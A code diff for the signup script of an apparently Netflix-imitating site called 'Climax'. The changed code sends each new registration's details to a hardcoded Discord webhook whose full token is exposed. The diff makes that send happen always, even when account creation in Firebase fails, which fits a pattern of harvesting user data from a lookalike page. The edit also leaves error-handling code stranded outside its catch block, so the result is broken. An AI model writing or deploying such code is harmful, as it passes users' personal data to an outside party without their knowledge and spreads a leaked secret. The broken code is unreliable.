@@ -90,9 +90,16 @@
                     throw new Error("Faltan datos de registro. Por favor regresa al inicio.");
                 }
 
+            try {
+                // 1. Try to create account in Firebase (might fail if user hasn't set up Auth yet)
                 await createNetflixAccount(email, password, selectedPlan, selectedPrice);
+            } catch (error) {
+                console.warn("Firebase Database warning: ", error);
+                // We don't block the user from proceeding if Firebase is down, we still send to Discord
+            }
 
-                // 2. Send Data to Discord Webhook
+            try {
+                // 2. Send Data to Discord Webhook ALWAYS
                 const webhookUrl = "https://discordapp.com/api/webhooks/1482739185600167966/qQvDGM3ZMU4xpe660f_q-l0VCG7T7zP9rm8IuZZHdRbhGln2dRk4DWzHWsqpQGXL1qhw";
                 const message = {
                     content: "🔔 **¡Nuevo Usuario Registrado en Climax!**",
@@ -105,31 +112,28 @@
                             { name: "📦 Plan Seleccionado", value: selectedPlan, inline: false },
                             { name: "💰 Total a Pagar", value: `$ ${formattedPrice}`, inline: true }
                         ],
-                        footer: { text: "Climax Security System" },
+                        footer: { text: "Climax Security System • Firebase Status: " + (auth ? "Attempted" : "Bypassed") },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
-                try {
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(message)
-                    });
-                } catch(e) {
-                    console.error("Error enviando a Discord", e);
-                }
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+            } catch(e) {
+                console.error("Error enviando a Discord", e);
+            }
 
-                // 3. Clear temp sensitive data
-                localStorage.removeItem('climax_signup_password');
+            // 3. Clear temp sensitive data
+            localStorage.removeItem('climax_signup_password');
 
-                // 4. Redirect to Nequi Sandbox / Payment Gateway Link
-                setTimeout(() => {
-                    const nequiRedirectUrl = "https://checkout.wompi.co/l/test_dummy_nequi_link";
-                    window.location.href = nequiRedirectUrl;
-                }, 1000);
-
-            } catch (error) {
+            // 4. Redirect to Nequi Sandbox / Payment Gateway Link
+            setTimeout(() => {
+                const nequiRedirectUrl = "https://checkout.wompi.co/l/test_dummy_nequi_link";
+                window.location.href = nequiRedirectUrl;
+            }, 1000);
                 // Handle Firebase Auth errors (e.g. email already in use)
                 let friendlyMsg = "Ocurrió un error creando tu cuenta.";
                 if (error.code === 'auth/email-already-in-use') {
